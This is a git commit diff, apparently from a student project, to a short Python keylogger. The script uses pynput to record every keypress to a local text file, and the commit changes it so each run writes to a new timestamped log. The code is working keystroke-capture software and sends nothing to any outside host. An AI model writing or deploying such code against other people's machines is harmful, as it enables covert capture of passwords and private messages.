4eb06a3b07321bb7b4d0b957b69952dc381c730c
HubertPogonowski <u56649@student.wat.edu.pl>
2025-09-17 13:20:58 +0200

    a

--- main.py
+++ main.py
@@ -1,7 +1,12 @@
 from pynput import keyboard
+import datetime
 
-def on_press(key):
-    logFile = open("log.txt", "a")
+now = datetime.datetime.now()
+filename = now.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+
+def on_press(key):   
+
+    logFile = open(filename, "a")
     char = str(key)
     char = char.replace("'", "")
 
@@ -14,10 +19,8 @@ def on_press(key):
     elif char == "Key.ctrl":
         char = " "      
 
-    logFile.write(char)
-    
-        
+    logFile.write(char)        
 
 
 with keyboard.Listener(on_press=on_press) as l:
-    l.join()
+    l.join()   
